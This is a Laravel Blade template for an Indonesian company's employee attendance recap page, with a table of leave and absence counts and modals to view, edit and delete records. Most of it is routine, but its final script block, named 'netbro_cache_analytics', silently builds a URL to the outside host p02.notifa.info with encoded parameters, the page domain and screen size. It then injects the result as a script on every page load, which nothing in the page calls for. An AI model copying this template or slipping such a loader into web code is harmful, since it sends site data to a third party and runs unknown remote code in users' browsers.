<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Rekap Presensi</title>
  <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datatables/css/dataTables.bootstrap.min.css"/>

  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>

  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <!-- Toastr untuk notifikasi -->
  <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">
</head>
<body>

  <!-- Wrapper Start -->
  <div class="be-wrapper">

    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End -->
    
    <!--   Content Start  -->
    <!-- <div class="be-wrapper be-fixed-sidebar"> -->
      <div class="be-content be-icons-list">
        <div class="page-head">
          <h2 class="page-head-title">Rekap Presensi</h2>
          <ol class="breadcrumb page-head-nav">
            <li><a href="/standar_presensi">Tabel Rekap Presensi</a></li>
            <li class="active">Edit Rekap Presensi</li>
          </ol>
        </div>
        

        <div class="main-content container-fluid">    
          <div class="panel panel-default panel-table">
            <div class="panel-body">
              <div class="panel-heading">Tabel Rekap Presensi
                <div  style="display: table-cell" class="tools">
                  <div style="display: table-cell; margin-top: 10px;" class="tools">
                    <div class="btn-group btn-hspace">
                      <a href="/presensi/unduh_default_presensi_laporan"><button style="height: 40px;" type="button" class="btn btn-danger">Unduh Rekap</button></a>
                    </div>
                  </div>
                  <form style="float: right;" id="form_submit_kalkulasi_presensi" name="submit2" action="/presensi/kalkulasi_rekap" method="POST">
                    @csrf
                    <div style="display: table-cell; margin-top: 10px;" class="tools">
                      <div class="btn-group btn-hspace">
                        <button style="height: 40px;" type="submit2" class="btn btn-primary">Kalkulasi Rekap</button>
                      </div>
                    </div>
                    <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                      <input style=" height: 40px" name="sampai_tanggal" class="form-control input-sm datetimepicker" type="date" required="">
                    </div>
                    <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                      <label style="margin-top: 12px">S.d</label>
                    </div>
                    <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                      <input style=" height: 40px" name="dari_tanggal" class="form-control input-sm datetimepicker" type="date" required="">
                    </div>
                  </form>
                </div> 
              </div>      
              <table id="table1" class="table table-striped table-hover table-fw-widget"> 
                <thead>
                  <tr>
                    <th width="100px">NIK</th>
                    <th width="100px">Id Sidik Jari</th>
                    <th width="100px">Nama</th>
                    <th width="100px">Divisi</th>
                    <th width="100px">Izin</th>  
                    <th width="100px">Jumlah Absen</th> 
                    <th width="100px">STSD</th>
                    <th width="100px">Sisa Cuti Tahunan</th>
                    <th width="100px" style="text-align: center; vertical-align: center;">Aksi</th>
                  </tr>
                </thead>
                <tbody>
                  @foreach($data_karyawan as $data_karyawan)
                  @foreach($default_presensi as $data)
                  @if($data_karyawan['id_sidik_jari'] == $data['id_sidik_jari'] && $data['id_sidik_jari'] != 0 )
                  <tr>
                    <td>{{$data_karyawan->nik}}</td>
                    <td>{{$data_karyawan->id_sidik_jari}}</td>
                    <td>{{$data_karyawan->nama_karyawan}}</td>
                    <td>{{$data_karyawan->divisi}}</td>
                    <td>{{$data->ijin}}</td>
                    <td>{{$data->jumlah_absen}}</td>
                    <td>{{$data->stsd}}</td>
                    <td>{{$data->sisa_cuti_tahunan}}</td>
                    <td>
                      <button data-toggle="modal" data-target="#rincian-data-presensi-{{$data['id_sidik_jari']}}" type="button" class="btn btn-space btn-success">Rincian</button>

                      <!-- The Modal Clock IN-->
                      <div class="modal fade" id="rincian-data-presensi-{{$data['id_sidik_jari']}}">
                        <div class="modal-dialog colored-header-primary">
                          <div class="modal-content">

                            <!-- Modal Header -->
                            <div class="modal-header">
                              <button type="button" class="close" data-dismiss="modal">&times;</button>
                              <table class="no-border no-strip skills">
                                <tbody class="no-border-x no-border-y">
                                  <tr>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">NIK</h4></td>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">: {{$data_karyawan['nik']}}</h4></td>    
                                  </tr>
                                  <tr>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">Id Sidik Jari</h4></td>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">: {{$data_karyawan['id_sidik_jari']}}</h4></td>    
                                  </tr>
                                  <tr>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">Nama Karyawan</h4></td>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">: {{$data_karyawan['nama_karyawan']}}</h4></td>    
                                  </tr>
                                  <tr>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">Divisi / Jabatan</h4></td>
                                    <td width="150px"><h4 style="color: white; margin-top: 10px;">: {{$data_karyawan['divisi']}}</h4></td>    
                                  </tr>
                                </tbody>
                              </table >
                            </div>

                            <form id="form_jam_clock_in" name="submit3" action="/presensi/{{$data['id_presensi']}}/update" method="POST">
                              @csrf
                              <!-- Modal body -->
                              <div class="modal-body">
                                <div style="width: 100%; display: table;">
                                  <div style="display: table-row">
                                    <table id="table2" style="table-layout: fixed; word-wrap: break-word; word-break: break-all;" class="table table-bordered table-striped table-hover table-fw-widget">
                                      <tbody>
                                       <!--  Row Pengalaman Bulan Start -->
                                       <tr>
                                        <td><b>Izin<b></td>
                                          <td>{{$data['ijin']}}</td>            
                                        </tr>
                                        <!--  Row Pengalaman Bulan End -->

                                        <tr>
                                          <td><b>Jumlah Absen<b></td>
                                            <td>{{$data['jumlah_absen']}}</td> 
                                          </tr>

                                          <!--  Row Gaji Pokok Start -->
                                          <tr>
                                            <td><b>Cuti Luar Tanggungan</b></td>
                                            <td>{{$data['cuti_luar_tanggungan']}}</td>            
                                          </tr>
                                          <!--  Row Gaji Pokok End -->

                                          <!--  Row Tunjangan Profesi Start -->
                                          <tr>
                                            <td><b>Cuti Penting</b></td>
                                            <td>{{$data['cuti_penting']}}</td>            
                                          </tr>
                                          <!--  Row Tunjangan Profesi End -->

                                          <!--  Row Tunjangan Jabatan Start -->
                                          <tr>
                                            <td ><b>Dispensasi</b></td>
                                            <td>{{$data['dispensasi']}}</td>            
                                          </tr>
                                          <!--  Row Tunjangan Jabatan End -->

                                          <!--  Row Tunjangan Kinerja Start -->
                                          <tr>
                                            <td ><b>SDSD</b></td>
                                            <td>{{$data['sdsd']}}</td>            
                                          </tr>
                                          <!--  Row Tunjangan Kinerja End -->
                                          <!--  Row Tunjangan Kinerja Start -->
                                          <tr>
                                            <td ><b>STSD</b></td>
                                            <td>{{$data['stsd']}}</td>            
                                          </tr>
                                          <!--  Row Tunjangan Kinerja End -->
                                          <!--  Row Tunjangan Kinerja Start -->
                                          <tr>
                                            <td ><b>Cuti Tahunan</b></td>
                                            <td>{{$data['cuti_tahunan']}}</td>  
                                          </tr>
                                          <!--  Row Tunjangan Kinerja End -->
                                          <!--  Row Tunjangan Kinerja Start -->
                                          <tr>
                                            <td ><b>Sisa Cuti Tahunan</b></td>
                                            <td>{{12 - (int)$data['cuti_tahunan']}}</td>
                                          </tr>
                                          <tr>
                                            <td ><b>Keterangan</b></td>
                                            <td>{{$data['keterangan']}}</td>
                                          </tr>
                                          <tr>
                                            <td ><b>Keterangan Cuti</b></td>
                                            <td>{{$data['keterangan_cuti']}}</td>
                                          </tr>                                         <!--  Row Tunjangan Kinerja End -->
                                        </tbody>
                                      </table>
                                    </div>
                                  </div>
                                </div>

                                <!-- Modal footer -->
                                <div class="modal-footer">
                                  <button type="button" class="btn btn-default" data-dismiss="modal">Tutup</button>
                                  
                                </div>
                              </form>
                            </div>
                          </div>
                        </div>
                        <!-- End The Modal Clock IN-->

                        <!-- Button Modal Edit -->
                        <button data-toggle="modal" data-target="#edit-data-presensi-{{$data->id_default_presensi}}" type="button" class="btn btn-space btn-warning">Edit</button>
                        <button data-toggle="modal" data-target="#hapus-data-presensi-{{$data->id_default_presensi}}" type="button" class="btn btn-space btn-danger"> Hapus </button>
                      </td>

                      <!--  Modal Edit Start -->
                      <div id="edit-data-presensi-{{$data->id_default_presensi}}" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                        <div class="modal-dialog">
                          <div class="modal-content">
                            <div class="modal-header">
                              <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                              <h3 class="modal-title">Edit Standar Presensi : {{$data_karyawan['nama_karyawan']}}</h3>
                            </div>
                            
                            <form action="/presensi/standar_presensi/{{$data->id_default_presensi}}/update" method="POST">
                              @csrf
                              <div class="modal-body">
                                <div class="form-group">
                                  <label>Izin</label>
                                  <input value="{{$data->ijin}}" name="ijin" type="text" class="form-control" >
                                </div>
                                <div class="form-group">
                                  <label>Jumlah Absen</label>
                                  <input value="{{$data->jumlah_absen}}" name="jumlah_absen" type="text" class="form-control" >
                                </div>
                                <div class="form-group">
                                  <label>Cuti Diluar Tanggungan</label>
                                  <input value="{{$data->cuti_diluar_tanggungan}}" name="cuti_diluar_tanggungan" type="text" class="form-control" >
                                </div>
                                <div class="form-group">
                                  <label>Cuti Penting</label>
                                  <input value="{{$data->cuti_penting}}" name="cuti_penting" type="text" class="form-control" >
                                </div>
                                <div class="form-group">
                                  <label>Dispensasi</label>
                                  <input value="{{$data->dispensasi}}" name="dispensasi" type="text" class="form-control" >
                                </div>
                                <div class="form-group">
                                  <label>SDSD (Sakit Dengan Surat Dokter)</label>
                                  <input value="{{$data->sdsd}}" name="sdsd" type="text" class="form-control" >
                                </div>
                                <div class="form-group">
                                  <label>STSD (Sakit Tanpa Surat Dokter)</label>
                                  <input value="{{$data->stsd}}" name="stsd" type="text" class="form-control" >
                                </div>
                                <div class="form-group">
                                  <label>Cuti Tahunan</label>
                                  <input value="{{$data->cuti_tahunan}}" name="cuti_tahunan" type="text" class="form-control" >
                                </div>
                                <div class="form-group">
                                  <label>Sisa Cuti Tahunan</label>
                                  <input value="{{$data->sisa_cuti_tahunan}}" name="sisa_cuti_tahunan" type="text" class="form-control" >
                                </div>
                                <div class="form-group">
                                  <label>Keterangan</label>
                                  <input value="{{$data->keterangan}}" name="keterangan" type="text" class="form-control" >
                                </div>
                                <div class="form-group">
                                  <label>Keterangan Cuti</label>
                                  <input value="{{$data->keterangan_cuti}}" name="keterangan_cuti" type="text" class="form-control" >
                                </div>     

                                <div class="modal-footer">
                                  <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                                  <button type="submit"  class="btn btn-primary">Simpan</button>
                                </div>
                              </div>
                            </form>
                          </div>
                        </div>
                      </div> 
                      <!--Akhir dari Modals Edit -->

                      <!-- Modals untuk Hapus -->
                      <div id="hapus-data-presensi-{{$data->id_default_presensi}}" tabindex="-1" role="dialog" class="modal fade">
                        <div class="modal-dialog">
                          <div class="modal-content">
                            <div class="modal-header">
                              <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                            </div>
                            <div class="modal-body">
                              <div class="text-center">
                                <div class="text-danger"><span class="modal-main-icon mdi mdi-close-circle-o"></span></div>
                                <h3>Apakah Anda yakin untuk menghapus data ini ?</h3>
                                <div class="xs-mt-50">
                                  <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                                  <a href="/presensi/standar_presensi/{{$data->id_default_presensi}}/delete"><button type="button" class="btn btn-space btn-danger">Hapus</button></a>
                                </div>
                              </div>
                            </div>
                            <div class="modal-footer"></div>
                          </div>
                        </div>
                      </div>
                      <!--Akhir dari Modals Hapus -->


                    </tr>
                    @else
                    @endif
                    @endforeach
                    @endforeach   
                  </tbody>
                </table>
              </div>
            </div>
            <!-- Table Divisi End -->

            




            <!-- </div> -->
          </div>
        </div>     
        <!--   Content End  -->

        <!--Footer Start --> 
        <div class="text-center">
          <div class="credits">
            <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
          </div>
        </div>
        <!--Footer End -->

      </div>
      <!--  Wrapper End -->

      <!-- Script Toastr untuk notifikasi-->
      <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
      <script>
        @if (Session::has('message'))
        var type = "{{Session::get('alert-type','info')}}";
        toastr.options = {
          "debug": false,
          "onclick": null,
          "fadeIn": 300,
          "fadeOut": 1000,
          "timeOut": 5000,
          "extendedTimeOut": 1000
        }

        switch(type)
        {
          case 'info':
          toastr.info("{{Session::get('message')}}");
          break;

          case 'success':
          toastr.success("{{Session::get('message')}}");
          break;

          case 'warning':
          toastr.warning("{{Session::get('message')}}");
          break;

          case 'error':
          toastr.error("{{Session::get('message')}}");
          break;
        }

        @endif

      </script>
      <!--  Inisialisasi Java Script -->
      <script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
      <script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
      <script src="assets/js/main.js" type="text/javascript"></script>
      <script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
      <script src="assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
      <script src="assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
      <script src="assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
      <script src="assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
      <script src="assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
      <script src="assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
      <script src="assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
      <script src="assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>
      <script type="text/javascript">
        $(document).ready(function(){
      //initialize the javascript
      App.init();
      App.dataTables();
    });
  </script>

  <script type="text/javascript">
    // Fungsi Logout

    $(function(){
      $('a#logout').click(function(){
        if(confirm('Apakah anda yakin ingin keluar ?')) {
          return true;
        }

        return false;
      });
    });


    // Fungsi Menu dashboard

    $(document).ready(function(){

      App.init();
      App.dashboard();

    });
  </script>
  <script type="text/javascript">
    if (self == top) {
      function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
          fn();
          callback();
        }, 0);
      }

      function sync(fn) {
        fn();
      }

      function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
      }
      netbro_cache_analytics(requestCfs, function() {});
    };

  </script>
</body>
</html>
